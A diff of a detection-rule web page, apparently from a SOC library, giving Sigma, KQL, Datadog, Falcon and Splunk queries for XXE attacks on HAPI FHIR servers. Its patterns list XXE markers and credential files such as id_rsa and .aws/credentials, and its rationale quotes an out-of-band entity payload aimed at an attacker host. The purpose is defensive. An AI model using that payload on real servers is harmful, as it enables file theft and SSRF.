+| extend XxeMarkers = extract_all(@&quot;&lt;!(?:DOCTYPE|ENTITY[^&gt;]*SYSTEM\s+&quot;&quot;[^&quot;&quot;]+&quot;&quot;)&quot;, Message)
+| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, SourcePort, DestinationIP, DestinationHostName, RequestURL, RequestMethod, RequestClientApplication, ReceivedBytes, XxeMarkers, Message
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: Java/HAPI-FHIR Process Reading Sensitive Local Files (post-XXE)
-id: 9b4c5d6e-7f8a-4b1c-cd2e-4f5a6b7c8d9e
-status: experimental
-description: Java/Tomcat/JBoss process running the HAPI FHIR utilities accesses high-sensitivity OS or app secret files — consistent with XsltUtilities.saxonTransform XXE file disclosure.
+    <div class="tab-content" id="art-07-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: XXE DOCTYPE/ENTITY Payload Targeting HAPI FHIR Endpoint (CVE-2026-55471)
+id: a7f3c4b2-8e1d-4a5c-9b3f-2d6e8c1a5f9b
+description: Detects HTTP POST/PUT to HAPI FHIR endpoints carrying an XML body with XXE markers (DOCTYPE, ENTITY, SYSTEM &quot;file:/http:&quot;). HAPI FHIR &lt;= 6.9.8 routes such input through XsltUtilities.saxonTransform on an unhardened Saxon TransformerFactory and is vulnerable to file disclosure + blind XXE/SSRF.
 references:
-  - https://github.com/advisories/GHSA-2f55-g35j-5jmf
+    - https://github.com/advisories/GHSA-2f55-g35j-5jmf
 author: SOC Detection Engineering
 date: 2026/06/18
 tags:
-  - attack.t1083
-  - attack.t1005
-  - attack.t1552.001
+    - attack.t1190
+    - attack.t1071.001
+    - attack.initial_access
 logsource:
-  category: file_access
-  product: linux
+    category: proxy
 detection:
-  proc:
-    Image|contains:
-      - &#x27;/java&#x27;
-      - &#x27;/javaw&#x27;
-  cmdline:
-    CommandLine|contains:
-      - &#x27;hapi&#x27;
-      - &#x27;fhir&#x27;
-      - &#x27;org.hl7.fhir&#x27;
-      - &#x27;tomcat&#x27;
-      - &#x27;catalina&#x27;
-  files:
-    TargetFilename|contains:
-      - &#x27;/etc/passwd&#x27;
-      - &#x27;/etc/shadow&#x27;
-      - &#x27;/etc/hosts&#x27;
-      - &#x27;application.properties&#x27;
-      - &#x27;application.yml&#x27;
-      - &#x27;.aws/credentials&#x27;
-      - &#x27;id_rsa&#x27;
-      - &#x27;hapi.properties&#x27;
-      - &#x27;fhir-server-config&#x27;
-  condition: proc and cmdline and files
+    selection_url:
+        cs-uri-stem|contains:
+            - &#x27;/fhir/&#x27;
+            - &#x27;/baseDstu&#x27;
+            - &#x27;/baseR4&#x27;
+            - &#x27;/baseR5&#x27;
+            - &#x27;/hl7/fhir/&#x27;
+    selection_method:
+        cs-method:
+            - POST
+            - PUT
+    selection_xxe:
+        cs-content|contains:
+            - &#x27;&lt;!DOCTYPE&#x27;
+            - &#x27;&lt;!ENTITY&#x27;
+            - &#x27;SYSTEM &quot;file:&#x27;
+            - &#x27;SYSTEM &quot;http&#x27;
+            - &#x27;&lt;!ENTITY %&#x27;
+    condition: all of selection_*
 falsepositives:
-  - HAPI FHIR config bootstrap on service start (fhir-server-config legitimately read at boot)
-  - Backup agents traversing the FHIR install directory
+    - Internal HAPI FHIR validator self-tests issued from a known scanner IP
+    - FHIR conformance suites (Touchstone, AEGIS) running scheduled XML payloads from allow-listed sources
 level: high</code></pre></div>
-    <div class="tab-content" id="art-07-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>source:(linux.auditd OR windows.sysmon OR java) (@process.name:(java OR javaw OR java.exe) OR @Image:(*\/java OR *\java.exe OR *\javaw.exe)) (@process.command_line:(*hapi* OR *fhir* OR *org.hl7.fhir* OR *XsltUtilities* OR *saxon* OR *tomcat* OR *catalina*) OR @CommandLine:(*hapi* OR *fhir* OR *org.hl7.fhir* OR *tomcat*)) (@file.path:(*\/etc\/passwd OR *\/etc\/shadow OR *application.properties OR *application.yml OR *.aws\/credentials OR *id_rsa OR *hapi.properties OR *fhir-server-config OR *\\win.ini OR *\\drivers\\etc\\hosts) OR @TargetFilename:(*application.properties OR *id_rsa OR *win.ini))</code></pre></div>
-    <div class="tab-content" id="art-07-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=FileOpenInfo ContextImageFileName=/(java|javaw|java\.exe)$/i
-| regex(&quot;(hapi|fhir|org\\.hl7\\.fhir|XsltUtilities|saxon|tomcat|catalina)&quot;, field=ContextCommandLine, strict=false)
-| TargetFileName=/(\/etc\/passwd|\/etc\/shadow|\/etc\/hosts|application\.properties|application\.yml|\.aws\/credentials|id_rsa|hapi\.properties|fhir-server-config|\\win\.ini|\\drivers\\etc\\hosts)/i
-| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=[count(), min(@timestamp)])</code></pre></div>
-    <div class="tab-content" id="art-07-uc1-spl"><span class="splunk-cat-pill splunk-cat-web" title="Splunk-research detection category">WEB</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as files values(Filesystem.process_name) as proc from datamodel=Endpoint.Filesystem where Filesystem.action=&quot;read&quot; Filesystem.process_name IN (&quot;java&quot;,&quot;java.exe&quot;,&quot;javaw.exe&quot;) (Filesystem.file_path=&quot;/etc/passwd&quot; OR Filesystem.file_path=&quot;/etc/shadow&quot; OR Filesystem.file_path=&quot;/etc/hosts&quot; OR Filesystem.file_path=&quot;*application.properties&quot; OR Filesystem.file_path=&quot;*application.yml&quot; OR Filesystem.file_path=&quot;*.aws/credentials&quot; OR Filesystem.file_path=&quot;*/proc/self/environ&quot; OR Filesystem.file_path=&quot;*\\Windows\\win.ini&quot; OR Filesystem.file_path=&quot;*\\Windows\\System32\\drivers\\etc\\hosts&quot; OR Filesystem.file_path=&quot;*id_rsa*&quot;) by host Filesystem.process_id Filesystem.process_name Filesystem.file_path | `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-07-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as files values(Filesystem.process_name) as proc from datamodel=Endpoint.Filesystem where Filesystem.action=&quot;read&quot; Filesystem.process_name IN (&quot;java&quot;,&quot;java.exe&quot;,&quot;javaw.exe&quot;) (Filesystem.file_path=&quot;/etc/passwd&quot; OR Filesystem.file_path=&quot;/etc/shadow&quot; OR Filesystem.file_path=&quot;/etc/hosts&quot; OR Filesystem.file_path=&quot;*application.properties&quot; OR Filesystem.file_path=&quot;*application.yml&quot; OR Filesystem.file_path=&quot;*.aws/credentials&quot; OR Filesystem.file_path=&quot;*/proc/self/environ&quot; OR Filesystem.file_path=&quot;*\\Windows\\win.ini&quot; OR Filesystem.file_path=&quot;*\\Windows\\System32\\drivers\\etc\\hosts&quot; OR Filesystem.file_path=&quot;*id_rsa*&quot;) by host Filesystem.process_id Filesystem.process_name Filesystem.file_path | `drop_dm_object_name(Filesystem)`</code></pre></div></div>
+    <div class="tab-content" id="art-07-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>(@http.url_details.path:(*/fhir/* OR */baseDstu* OR */baseR4/* OR */baseR5/* OR */hl7/fhir/*)) AND @http.method:(POST OR PUT) AND (@http.request.body:(*\&lt;\!DOCTYPE* OR *\&lt;\!ENTITY* OR *SYSTEM\ \&quot;file\:* OR *SYSTEM\ \&quot;http* OR *\&lt;\!ENTITY\ %*) OR @network.http.request_body:(*\&lt;\!DOCTYPE* OR *\&lt;\!ENTITY*))</code></pre></div>
+    <div class="tab-content" id="art-07-uc1-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=t count values(Web.http_method) as http_methods values(Web.http_content_type) as content_types values(Web.user_agent) as user_agents sum(Web.bytes_in) as total_bytes_in from datamodel=Web.Web where (Web.url=&quot;*/fhir/*&quot; OR Web.url=&quot;*/baseDstu*&quot; OR Web.url=&quot;*/baseR4/*&quot; OR Web.url=&quot;*/baseR5/*&quot; OR Web.url=&quot;*/hl7/fhir/*&quot;) Web.http_method IN (&quot;POST&quot;,&quot;PUT&quot;) (Web.http_content_type IN (&quot;application/xml&quot;,&quot;text/xml&quot;,&quot;application/fhir+xml&quot;,&quot;application/xml+fhir&quot;) OR Web.bytes_in&gt;1024) by Web.src Web.dest Web.url _time
+| `drop_dm_object_name(Web)`
+| join type=inner src dest [search index=waf OR index=proxy OR sourcetype IN (&quot;suricata&quot;,&quot;snort&quot;,&quot;zeek_http&quot;,&quot;waf:*&quot;) (&quot;&lt;!DOCTYPE&quot; OR &quot;&lt;!ENTITY&quot; OR &quot;SYSTEM \&quot;file:&quot; OR &quot;SYSTEM \&quot;http&quot; OR &quot;&lt;!ENTITY %&quot;) | rename src_ip as src dest_ip as dest | fields src dest _time url body]
+| table _time src dest url http_methods content_types total_bytes_in user_agents body</code></pre><pre class="spl-mode-body" id="art-07-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count values(Web.http_method) as http_methods values(Web.http_content_type) as content_types values(Web.user_agent) as user_agents sum(Web.bytes_in) as total_bytes_in from datamodel=Web.Web where (Web.url=&quot;*/fhir/*&quot; OR Web.url=&quot;*/baseDstu*&quot; OR Web.url=&quot;*/baseR4/*&quot; OR Web.url=&quot;*/baseR5/*&quot; OR Web.url=&quot;*/hl7/fhir/*&quot;) Web.http_method IN (&quot;POST&quot;,&quot;PUT&quot;) (Web.http_content_type IN (&quot;application/xml&quot;,&quot;text/xml&quot;,&quot;application/fhir+xml&quot;,&quot;application/xml+fhir&quot;) OR Web.bytes_in&gt;1024) by Web.src Web.dest Web.url _time
+| `drop_dm_object_name(Web)`
+| join type=inner src dest [search index=waf OR index=proxy OR sourcetype IN (&quot;suricata&quot;,&quot;snort&quot;,&quot;zeek_http&quot;,&quot;waf:*&quot;) (&quot;&lt;!DOCTYPE&quot; OR &quot;&lt;!ENTITY&quot; OR &quot;SYSTEM \&quot;file:&quot; OR &quot;SYSTEM \&quot;http&quot; OR &quot;&lt;!ENTITY %&quot;) | rename src_ip as src dest_ip as dest | fields src dest _time url body]
+| table _time src dest url http_methods content_types total_bytes_in user_agents body</code></pre></div></div>
   </div>
 </details>
-<details class="uc" data-uc-slug="fcf0ff12f8" data-platforms="cloudwatch,datadog,def,falcon,sent,spl" data-targets="linux,windows">
+<details class="uc" data-uc-slug="bc5045b46b" data-platforms="datadog,def,falcon,sent,spl" data-targets="linux,windows">
   <summary>
-    <span class="uc-title">FHIR Java process beacons to first-seen external host (XXE OOB / parameter-entity exfil)</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Command &amp; Control</span>
+    <span class="uc-title">JVM process outbound to non-allow-listed external host (XXE OOB exfil callback)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Actions on Objectives</span>
     <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="fcf0ff12f8" title="Copy share link to this UC" aria-label="Copy share link">
+    <button class="share-btn" data-share-uc="bc5045b46b" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Identifies DNS/network connections from the HAPI FHIR Java process to an external host the org has never seen, immediately following an inbound HTTP request to a FHIR endpoint. Catches blind/OOB XXE where the attacker uses an external parameter entity (% oob SYSTEM &quot;http://attacker/...&quot;) to exfiltrate file contents through the URI.
+    <div class="uc-desc">Detects HAPI-FHIR-tagged JVM processes (command line contains hapi-fhir / org.hl7.fhir / ca.uhn.hapi) reaching out to public IPs / URLs that are not on the documented terminology service allow-list. This is the directly observable consequence of a successful blind XXE — the Saxon TransformerFactory resolves an attacker `&lt;!ENTITY % oob SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;` and the JVM connects back to the attacker host.
 
-Rationale: PoC in the advisory uses both an external general entity (file disclosure) and an external parameter entity (% oob SYSTEM &quot;http://127.0.0.1:port/evil-fhir-xslt-ssrf.dtd&quot;) — the latter triggers an outbound HTTP/DNS request from the Saxon parser. Detection pivots on first-seen external destination from the FHIR Java process; cross-checked against MITRE T1071.004 (DNS-based exfil).
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-2f55-g35j-5jmf
-  • https://attack.mitre.org/techniques/T1071/004/
-  • https://portswigger.net/web-security/xxe/blind</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Application Layer Protocol: DNS">T1071.004</span> <span class="ind tech" title="Exfiltration Over C2 Channel">T1041</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Resolution.DNS</span> <span class="ind">Network_Traffic.All_Traffic</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Newly-onboarded HL7 terminology server first contact (tx.fhir.org, hl7.org)</li><li>Maven/Gradle dependency resolution on app restart pulling new transitive deps</li><li>IG package downloads from packages.fhir.org / packages2.fhir.org first time</li><li>TLS OCSP/CRL lookups against newly-issued cert authorities</li><li>HAPI&#x27;s built-in version-check / telemetry to ca.uhn.hapi.fhir on first start of a new minor version</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (RemoteUrl has_any (&quot;tx.fhir.org&quot;,&quot;packages.fhir.org&quot;,&quot;packages2.fhir.org&quot;,&quot;hl7.org&quot;,&quot;terminology.hl7.org&quot;)) and not (RemoteUrl endswith &quot;.pki.goog&quot; or RemoteUrl endswith &quot;.digicert.com&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 — Triage: Resolve the queried domain — WHOIS age, passive-DNS history, ASN; if domain is &lt;30 days old or matches Interactsh/Burp-Collaborator/oast patterns, escalate. Step 2 — Contain: Sinkhole the domain at the resolver; block at egress firewall; pull packet captures of any HTTP fetch (the DTD body often carries the leaked file content URL-encoded). Step 3 — Hunt: Correlate the DNS event back to the inbound HTTP request on the FHIR endpoint (window 0-30s before) — recover the malicious DOCTYPE/ENTITY payload. Search all FHIR Java hosts for the same DNS pattern; review file reads from the FHIR process in the 60s preceding the outbound call to identify which file was exfiltrated.</div></details>
+Rationale: The OOB sentinel pattern in the advisory&#x27;s PoC (`&lt;!ENTITY % oob SYSTEM &quot;http://127.0.0.1:&lt;oobPort&gt;/evil-fhir-xslt-ssrf.dtd&quot;&gt;`) means a successful exploit forces the JVM to dial out to attacker-controlled hosts. Allow-list excludes the documented FHIR terminology services (tx.fhir.org, terminology.hl7.org, loinc.org, snomed.org) plus standard Maven/repo destinations a healthy HAPI host would legitimately reach. Cmd-line tags (`hapi-fhir`, `org.hl7.fhir`, `ca.uhn.hapi`, `XsltUtilities`) scope to actual FHIR JVMs rather than every Java process.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exfiltration Over C2 Channel">T1041</span> <span class="ind tech" title="Application Layer Protocol: Web Protocols">T1071.001</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span> <span class="ind">Endpoint.Processes</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>HAPI FHIR pulling a new ValueSet / CodeSystem from an org-specific terminology server not on the default allow-list</li><li>Java application telemetry/APM agent (New Relic, AppDynamics, Datadog APM) calling its SaaS endpoint</li><li>License-check call-home from a commercial FHIR add-on</li><li>Manual git/maven build step running inside a misconfigured prod JVM container</li><li>Custom NPM-style package downloads during deployment from a self-hosted artifact repo</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where InitiatingProcessCommandLine !has &quot;newrelic&quot; and InitiatingProcessCommandLine !has &quot;appdynamics&quot; and InitiatingProcessCommandLine !has &quot;datadog-agent&quot; and InitiatingProcessCommandLine !has &quot;-javaagent&quot;</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: pull the JVM&#x27;s parent + sibling processes around the FirstSeen window from DeviceProcessEvents; confirm it&#x27;s a HAPI FHIR server JVM, not a build tool or APM agent. Resolve the RemoteIP/RemoteUrl against passive-DNS and check for newly-registered domains (&lt;30d). 2) Contain: block the destination IP/domain at egress; if PoC-grade beaconing is confirmed, isolate the FHIR host pending forensics. 3) Hunt: pivot to UC2/UC4 for the same DeviceName 5 minutes prior to FirstSeen to find the inbound XXE POST, and to UC5 for additional DNS lookups to fresh domains. Also enumerate all CommonSecurityLog / W3CIISLog requests from external IPs to the FHIR endpoint in the same window.</div></details>
     <div class="tabs">
       <button class="tab-btn active" data-target="art-07-uc2-kql">Defender KQL</button>
       <button class="tab-btn" data-target="art-07-uc2-sentinel">Sentinel KQL</button>
       <button class="tab-btn" data-target="art-07-uc2-datadog">Datadog</button>
       <button class="tab-btn" data-target="art-07-uc2-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-07-uc2-cloudwatch">CloudWatch Logs Insights</button>
       <button class="tab-btn" data-target="art-07-uc2-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-07-uc2-kql"><pre><button class="copy-btn">COPY</button><code>let Baseline = DeviceNetworkEvents
-    | where Timestamp between (ago(30d) .. ago(1h))
-    | where InitiatingProcessFileName in~ (&quot;java.exe&quot;,&quot;javaw.exe&quot;)
-    | where isnotempty(RemoteUrl)
-    | summarize by RemoteUrl;
+    <div class="tab-content active" id="art-07-uc2-kql"><pre><button class="copy-btn">COPY</button><code>let AllowList = dynamic([&quot;microsoft.com&quot;,&quot;azure.com&quot;,&quot;oracle.com&quot;,&quot;github.com&quot;,&quot;githubusercontent.com&quot;,&quot;maven.org&quot;,&quot;sonatype.com&quot;,&quot;hl7.org&quot;,&quot;tx.fhir.org&quot;,&quot;terminology.hl7.org&quot;,&quot;loinc.org&quot;,&quot;snomed.org&quot;,&quot;nih.gov&quot;,&quot;who.int&quot;]);
+let HapiHosts = DeviceProcessEvents
+    | where Timestamp &gt; ago(7d)
+    | where InitiatingProcessFileName in~ (&quot;java.exe&quot;,&quot;javaw.exe&quot;,&quot;java&quot;)
+    | where InitiatingProcessCommandLine has_any (&quot;hapi-fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;ca.uhn.hapi&quot;,&quot;XsltUtilities&quot;,&quot;fhir-validator&quot;,&quot;HapiFhirJpaServer&quot;,&quot;jpa-server&quot;)
+           or ProcessCommandLine has_any (&quot;hapi-fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;ca.uhn.hapi&quot;,&quot;XsltUtilities&quot;,&quot;fhir-validator&quot;,&quot;HapiFhirJpaServer&quot;,&quot;jpa-server&quot;)
+    | distinct DeviceId;
 DeviceNetworkEvents
-| where Timestamp &gt; ago(1h)
-| where InitiatingProcessFileName in~ (&quot;java.exe&quot;,&quot;javaw.exe&quot;)
-| where InitiatingProcessCommandLine has_any (&quot;hapi&quot;,&quot;fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;tomcat&quot;,&quot;catalina&quot;,&quot;saxon&quot;)
+| where Timestamp &gt; ago(1d)
+| where DeviceId in (HapiHosts)
+| where InitiatingProcessFileName in~ (&quot;java.exe&quot;,&quot;javaw.exe&quot;,&quot;java&quot;)
 | where RemoteIPType == &quot;Public&quot;
-| where isnotempty(RemoteUrl) and RemoteUrl !endswith &quot;.local&quot; and RemoteUrl !endswith &quot;.internal&quot;
-| join kind=leftanti Baseline on RemoteUrl
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessId, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort, ActionType
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>let Baseline = ImDnsActivity
-    | where TimeGenerated between (ago(30d) .. ago(1h))
-    | where SrcUsername has_any (&quot;tomcat&quot;,&quot;java&quot;,&quot;jboss&quot;,&quot;wildfly&quot;)
-    | summarize by DnsQuery;
-ImDnsActivity
-| where TimeGenerated &gt; ago(1h)
-| where SrcUsername has_any (&quot;tomcat&quot;,&quot;java&quot;,&quot;jboss&quot;,&quot;wildfly&quot;)
-   or DvcHostname has_any (&quot;fhir&quot;,&quot;hapi&quot;)
-| where DnsQuery !endswith &quot;.local&quot;
-  and DnsQuery !endswith &quot;.internal&quot;
-  and DnsQuery !endswith &quot;.svc.cluster.local&quot;
-  and DnsQuery !contains &quot;.microsoft.com&quot;
-  and DnsQuery !contains &quot;.azure.com&quot;
-  and DnsQuery !contains &quot;.amazonaws.com&quot;
-| join kind=leftanti Baseline on DnsQuery
-| summarize FirstSeen = min(TimeGenerated), QueryCount = count() by DvcHostname, SrcUsername, DnsQuery
+| where ActionType in (&quot;ConnectionSuccess&quot;,&quot;ConnectionAttempt&quot;,&quot;ConnectionFound&quot;)
+| extend Host = tolower(coalesce(RemoteUrl, tostring(RemoteIP)))
+| where not(Host has_any (AllowList))
+| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp), Connections = count(), Ports = make_set(RemotePort, 10) by DeviceName, InitiatingProcessFileName, RemoteIP, RemoteUrl, InitiatingProcessCommandLine
+| where Connections &lt; 10
 | order by FirstSeen desc</code></pre></div>
-    <div class="tab-content" id="art-07-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>(source:(linux.auditd OR windows.sysmon OR dns) (@process.name:(java OR javaw OR java.exe) OR @Image:(*\/java OR *\java.exe OR *\javaw.exe) OR @ContextImageFileName:(*\/java OR *\java.exe))) (@process.command_line:(*hapi* OR *fhir* OR *org.hl7.fhir* OR *tomcat* OR *catalina*) OR @ContextCommandLine:(*hapi* OR *fhir*)) @dns.question.name:* -@dns.question.name:(*.local OR *.internal OR *.svc.cluster.local OR *.microsoft.com OR *.azure.com OR *.amazonaws.com OR *.googleapis.com)</code></pre></div>
-    <div class="tab-content" id="art-07-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=DnsRequest ContextImageFileName=/(java|javaw|java\.exe)$/i
-| regex(&quot;(hapi|fhir|org\\.hl7\\.fhir|tomcat|catalina|saxon)&quot;, field=ContextCommandLine, strict=false)
-| NOT DomainName=/\.(local|internal|svc\.cluster\.local|microsoft\.com|azure\.com|amazonaws\.com|googleapis\.com|akadns\.net)$/i
-| groupBy([aid, ComputerName, DomainName], function=[count(), min(@timestamp), max(@timestamp)])
-| join({
-    #event_simpleName=DnsRequest ContextImageFileName=/(java|javaw)/i
-    | _time&lt;now()-30d*1s
-    | groupBy([DomainName], function=count(as=baseline_count))
-  }, field=DomainName, mode=left)
-| baseline_count=&quot;&quot;
-| sort(min, order=desc)</code></pre></div>
-    <div class="tab-content" id="art-07-uc2-cloudwatch"><pre><button class="copy-btn">COPY</button><code># log group: /aws/route53/resolver-query-logs (if HAPI runs in AWS)
-fields @timestamp, srcaddr, srcids.instance, query_name, query_type, rcode
-| filter query_type in [&quot;A&quot;,&quot;AAAA&quot;,&quot;TXT&quot;]
-| filter not (query_name like /\.internal\.?$/) and not (query_name like /\.amazonaws\.com\.?$/) and not (query_name like /\.compute\.internal\.?$/)
-| stats count() as queries, min(@timestamp) as firstSeen by srcaddr, query_name
-| filter queries &lt; 5
-| sort firstSeen desc
-| limit 200</code></pre></div>
-    <div class="tab-content" id="art-07-uc2-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-07-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-07-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-07-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(DNS.query) as queries values(DNS.src) as src from datamodel=Network_Resolution.DNS where DNS.src_process_name IN (&quot;java&quot;,&quot;java.exe&quot;,&quot;javaw.exe&quot;) by DNS.query DNS.src DNS.src_process_name | `drop_dm_object_name(DNS)` | search query!=&quot;*.local&quot; query!=&quot;*.internal&quot; query!=&quot;*.svc.cluster.local&quot; | join type=left query [ search index=dns_baseline earliest=-30d@d latest=-1d@d sourcetype=dns | stats min(_time) as baseline_firstSeen by query ] | where isnull(baseline_firstSeen) AND firstTime &gt; relative_time(now(), &quot;-24h&quot;) | table firstTime src src_process_name query</code></pre><pre class="spl-mode-body" id="art-07-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(DNS.query) as queries values(DNS.src) as src from datamodel=Network_Resolution.DNS where DNS.src_process_name IN (&quot;java&quot;,&quot;java.exe&quot;,&quot;javaw.exe&quot;) by DNS.query DNS.src DNS.src_process_name | `drop_dm_object_name(DNS)` | search query!=&quot;*.local&quot; query!=&quot;*.internal&quot; query!=&quot;*.svc.cluster.local&quot; | join type=left query [ search index=dns_baseline earliest=-30d@d latest=-1d@d sourcetype=dns | stats min(_time) as baseline_firstSeen by query ] | where isnull(baseline_firstSeen) AND firstTime &gt; relative_time(now(), &quot;-24h&quot;) | table firstTime src src_process_name query</code></pre></div></div>
+    <div class="tab-content" id="art-07-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>let AllowList = dynamic([&quot;microsoft.com&quot;,&quot;azure.com&quot;,&quot;oracle.com&quot;,&quot;github.com&quot;,&quot;maven.org&quot;,&quot;sonatype.com&quot;,&quot;hl7.org&quot;,&quot;tx.fhir.org&quot;,&quot;terminology.hl7.org&quot;,&quot;loinc.org&quot;,&quot;snomed.org&quot;]);
+let HapiHosts = ImProcessCreate
+    | where TimeGenerated &gt; ago(7d)
+    | where ActingProcessName has_any (&quot;java.exe&quot;,&quot;javaw.exe&quot;,&quot;java&quot;) or TargetProcessName has_any (&quot;java.exe&quot;,&quot;javaw.exe&quot;,&quot;java&quot;)
+    | where ActingProcessCommandLine has_any (&quot;hapi-fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;ca.uhn.hapi&quot;,&quot;XsltUtilities&quot;)
+         or TargetProcessCommandLine has_any (&quot;hapi-fhir&quot;,&quot;org.hl7.fhir&quot;,&quot;ca.uhn.hapi&quot;,&quot;XsltUtilities&quot;)
+    | distinct DvcHostname;
+ImNetworkSession
+| where TimeGenerated &gt; ago(1d)
+| where DvcHostname in (HapiHosts)
+| where SrcUsername has_any (&quot;java&quot;,&quot;javaw&quot;) or DstHostname != &quot;&quot;
+| where NetworkDirection == &quot;Outbound&quot; or isempty(NetworkDirection)
+| extend Host = tolower(coalesce(DstHostname, DstIpAddr))
+| where not(Host has_any (AllowList))
+| where DstIpAddr !startswith &quot;10.&quot; and DstIpAddr !startswith &quot;192.168.&quot; and not(DstIpAddr matches regex @&quot;^172\.(1[6-9]|2[0-9]|3[01])\.&quot;)
+| summarize FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), Conns = count() by DvcHostname, DstIpAddr, DstHostname, DstPortNumber
+| where Conns &lt; 10
+| order by FirstSeen desc</code></pre></div>
+    <div class="tab-content" id="art-07-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>source:(windows.sysmon OR linux.auditd) (@process.name:(java OR java.exe OR javaw.exe OR Java.exe) OR @Image:(*\\java.exe OR *\\javaw.exe OR *\\Java.exe OR */bin/java)) @network.destination.ip:* NOT (@network.destination.ip:(10.0.0.0/8 OR 192.168.0.0/16 OR 172.16.0.0/12) OR @DestinationHostname:(*.hl7.org OR tx.fhir.org OR terminology.hl7.org OR *.loinc.org OR *snomed.org OR *.maven.org OR *.sonatype.com OR *.github.com OR *.microsoft.com))</code></pre></div>
+    <div class="tab-content" id="art-07-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=NetworkConnectIP4
+| ContextImageFileName=/\\(java|javaw)\.exe$/i OR ContextImageFileName=/\/bin\/java$/i
+| NOT cidr(&quot;10.0.0.0/8&quot;, field=RemoteAddressIP4)
+| NOT cidr(&quot;192.168.0.0/16&quot;, field=RemoteAddressIP4)
